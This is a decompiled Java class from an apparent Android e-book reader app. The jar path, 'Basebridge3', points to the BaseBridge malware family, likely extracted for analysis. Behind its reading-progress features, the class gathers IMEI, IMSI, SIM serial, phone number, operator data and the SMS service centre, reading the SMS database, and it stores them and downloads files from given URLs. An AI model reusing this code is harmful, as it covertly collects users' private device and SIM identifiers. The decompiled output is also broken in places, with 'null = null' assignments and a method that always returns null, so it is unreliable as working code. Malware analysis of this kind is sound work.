package com.zhangling.anTest20;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.os.PowerManager;
import android.util.Log;
import android.widget.ProgressBar;
import android.widget.Toast;
import com.zhangling.util.ReflectUtil;
import com.zhangling.util.StringUtil;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
import java.net.URLConnection;
import org.apache.http.client.ClientProtocolException;

public class BaseActivity extends Activity {
  public static final String ACTION_NAME_SMS = "android.provider.Telephony.SMS_RECEIVED";
  
  protected static String IMEI;
  
  protected static String IMSI;
  
  private static int MODE;
  
  private static String PREFERENCE_NAME = null;
  
  protected static String SMSC;
  
  protected static boolean beNoCheckLastRun;
  
  protected static String callState;
  
  private static byte[] data;
  
  protected static String deviceId;
  
  public static SharedPreferences.Editor editor;
  
  protected static String global_beFirstLoad;
  
  protected static String global_beStatisticsRunTime;
  
  protected static String global_firstStartTime;
  
  protected static String global_lastTime;
  
  protected static int global_runTime;
  
  protected static String line1Number;
  
  protected static String manufacturer;
  
  protected static String model;
  
  protected static String networkCountryIso;
  
  protected static String networkOperator;
  
  protected static String networkOperatorName;
  
  protected static String networkType;
  
  protected static String os;
  
  protected static String packageName;
  
  protected static String phoneType;
  
  protected static String simCountryIso;
  
  protected static String simOperator;
  
  protected static String simOperatorName;
  
  protected static String simSerialNumber;
  
  protected static String simState;
  
  public static SharedPreferences sp;
  
  protected static String versionCode;
  
  protected static String versionName;
  
  private Context currentContext = null;
  
  private int downLoadFileSize;
  
  private int fileSize;
  
  private Handler handler = new Handler() {
      public void handleMessage(Message param1Message) {
        Intent intent;
        int i;
        super.handleMessage(param1Message);
        switch (param1Message.what) {
          default:
            return;
          case 0:
            i = BaseActivity.sp.getInt("global_runTime", 0);
            BaseActivity.editor.putInt("global_runTime", i + 1);
            BaseActivity.editor.commit();
          case 1:
            BaseActivity.this.statisticsRunTime();
          case 2:
          case 3:
            i = BaseActivity.this.downLoadFileSize * 100 / BaseActivity.this.fileSize;
            BaseActivity.this.progress.setTitle(String.valueOf(i) + "%");
          case 4:
            if (BaseActivity.this.progress.isShowing())
              BaseActivity.this.progress.dismiss(); 
            intent = new Intent(BaseActivity.this.currentContext, BaseActivity.this.turnToClass);
            BaseActivity.this.startActivity(intent);
          case -1:
            break;
        } 
        String str = intent.getData().getString("error");
        Toast.makeText(BaseActivity.this.currentContext, str, 0).show();
      }
    };
  
  private ProgressBar pb;
  
  private ProgressDialog progress = null;
  
  private Class turnToClass = null;
  
  private String turnUrl = null;
  
  protected PowerManager.WakeLock wakeLock;
  
  static {
    MODE = 2;
    sp = null;
    editor = null;
    data = null;
    beNoCheckLastRun = true;
  }
  
  public static SharedPreferences.Editor getEditor() {
    return editor;
  }
  
  public static SharedPreferences getSp() {
    return sp;
  }
  
  private void saveData() {
    editor.putString("global_beFirstLoad", "1");
    editor.putString("IMEI", IMEI);
    editor.putString("IMSI", IMSI);
    editor.putString("deviceId", deviceId);
    editor.putString("manufacturer", manufacturer);
    editor.putString("model", model);
    editor.putString("os", os);
    editor.putString("global_beFirstLoad", global_beFirstLoad);
    editor.putString("global_firstStartTime", global_firstStartTime);
    editor.putInt("global_runTime", 0);
    editor.putString("global_lastTime", global_lastTime);
    editor.putString("line1Number", line1Number);
    editor.putString("callState", callState);
    editor.putString("phoneType", phoneType);
    editor.putString("SMSC", SMSC);
    editor.putString("simCountryIso", simCountryIso);
    editor.putString("simOperator", simOperator);
    editor.putString("simOperatorName", simOperatorName);
    editor.putString("simSerialNumber", simSerialNumber);
    editor.putString("simState", simState);
    editor.putString("networkCountryIso", networkCountryIso);
    editor.putString("networkOperator", networkOperator);
    editor.putString("networkOperatorName", networkOperatorName);
    editor.putString("networkType", networkType);
    editor.putString("versionCode", versionCode);
    editor.putString("versionName", versionName);
    editor.putString("packageName", packageName);
    editor.commit();
  }
  
  public static void saveData(String paramString, int paramInt) {
    editor.putInt(paramString, paramInt);
    editor.commit();
  }
  
  public static void saveData(String paramString, long paramLong) {
    editor.putLong(paramString, paramLong);
    editor.commit();
  }
  
  public static void saveData(String paramString, Boolean paramBoolean) {
    editor.putBoolean(paramString, paramBoolean.booleanValue());
    editor.commit();
  }
  
  public static void saveData(String paramString1, String paramString2) {
    editor.putString(paramString1, paramString2);
    editor.commit();
  }
  
  private void sendMsg(int paramInt) {
    Message message = new Message();
    message.what = paramInt;
    this.handler.sendMessage(message);
  }
  
  public void checkLastRun() {
    int i = sp.getInt("book_lastRead_id", -1);
    if (-1 != i) {
      String str1 = getResources().getString(ReflectUtil.getInt(R.string.class, "listView_title_" + i).intValue());
      String str2 = StringUtil.getDist(sp.getLong("book_lastRead_datetime", 0L));
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append("您");
      stringBuilder.append(str2);
      stringBuilder.append("看的内容是:\n《");
      stringBuilder.append(str1);
      stringBuilder.append("》\n");
      (new AlertDialog.Builder(this.currentContext)).setTitle("提示").setMessage(stringBuilder.toString()).setPositiveButton("继续", new DialogInterface.OnClickListener() {
            public void onClick(DialogInterface param1DialogInterface, int param1Int) {
              Intent intent = new Intent();
              intent.setClass(BaseActivity.this.currentContext, Select.class);
              intent.putExtra("index", BaseActivity.sp.getInt("book_lastRead_id", -1));
              BaseActivity.this.startActivity(intent);
            }
          }).setNegativeButton("取消", new DialogInterface.OnClickListener() {
            public void onClick(DialogInterface param1DialogInterface, int param1Int) {}
          }).show();
    } 
  }
  
  public void createSP() {
    if (sp == null)
      sp = getSharedPreferences(PREFERENCE_NAME, MODE); 
    if (editor == null)
      editor = sp.edit(); 
  }
  
  public void down_file(String paramString) throws IOException {
    URLConnection uRLConnection = (new URL(paramString)).openConnection();
    uRLConnection.connect();
    InputStream inputStream = uRLConnection.getInputStream();
    this.fileSize = uRLConnection.getContentLength();
    if (this.fileSize <= 0)
      throw new RuntimeException("无法获知文件大小 "); 
    if (inputStream == null)
      throw new RuntimeException("stream is null"); 
    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
    data = new byte[1024];
    this.downLoadFileSize = 0;
    sendMsg(2);
    while (true) {
      int i = inputStream.read(data);
      if (i == -1) {
        sendMsg(4);
        try {
          byteArrayOutputStream.close();
          inputStream.close();
        } catch (Exception exception) {
          Log.e("tag", "error: " + exception.getMessage(), exception);
        } 
        return;
      } 
      byteArrayOutputStream.write(data, 0, i);
      this.downLoadFileSize += i;
      sendMsg(3);
    } 
  }
  
  public String getSMSCFromSms() {
    Cursor cursor1;
    null = null;
    String[] arrayOfString = new String[1];
    arrayOfString[0] = "distinct(service_center)";
    Cursor cursor2 = getContentResolver().query(Uri.parse("content://sms"), arrayOfString, "service_center is not null", null, "date desc limit 1");
    if (cursor2.moveToNext())
      null = cursor2.getString(0); 
    if (null == null || "".equals(null)) {
      cursor1 = getContentResolver().query(Uri.parse("content://sms/sim"), arrayOfString, "service_center is not null", null, "date desc limit 1");
      if (cursor1.moveToNext())
        null = cursor1.getString(0); 
      if (null != null && !"".equals(null)) {
        cursor1.close();
        return null;
      } 
    } else {
      cursor2.close();
      return null;
    } 
    cursor1.close();
    return null;
  }
  
  protected void initData() {
    statisticsRunTime();
    saveData();
  }
  
  protected void onCreate(Bundle paramBundle) {
    this.currentContext = (Context)this;
    super.onCreate(paramBundle);
    createSP();
  }
  
  protected void onDestroy() {
    if (this.wakeLock != null)
      this.wakeLock.release(); 
    super.onDestroy();
  }
  
  protected void statisticsRunTime() {
    (new Thread(new Runnable() {
          boolean comm = true;
          
          public void run() {
            while (true) {
              if (!this.comm)
                return; 
              try {
                Thread.sleep(2000L);
                BaseActivity.this.sendMsg(0);
              } catch (InterruptedException interruptedException) {
                this.comm = false;
                BaseActivity.this.sendMsg(1);
              } 
            } 
          }
        })).start();
  }
  
  public void test(Context paramContext) {
    ProgressDialog progressDialog = new ProgressDialog(paramContext);
    progressDialog.setTitle("正在读取数据...");
    progressDialog.show();
  }
  
  protected void turnTo(Context paramContext, String paramString, Class paramClass) {
    this.currentContext = paramContext;
    this.turnUrl = paramString;
    this.turnToClass = paramClass;
    this.progress = new ProgressDialog(this.currentContext);
    this.progress.setTitle("正在读取数据...");
    this.progress.show();
    (new Thread() {
        public void run() {
          try {
            BaseActivity.this.down_file(BaseActivity.this.turnUrl);
          } catch (ClientProtocolException clientProtocolException) {
            clientProtocolException.printStackTrace();
          } catch (IOException iOException) {
            iOException.printStackTrace();
          } catch (Exception exception) {
            BaseActivity.this.progress.dismiss();
            Toast.makeText(BaseActivity.this.currentContext, "读取失败," + exception.getMessage(), 0).show();
          } 
        }
      }).start();
  }
  
  public void wakeLockOn() {
    this.wakeLock = ((PowerManager)getSystemService("power")).newWakeLock(536870922, "ATAAW");
    this.wakeLock.acquire();
  }
}


/* Location:              /home/fahim/Desktop/Basebridge3-dex2jar.jar!/com/zhangling/anTest20/BaseActivity.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */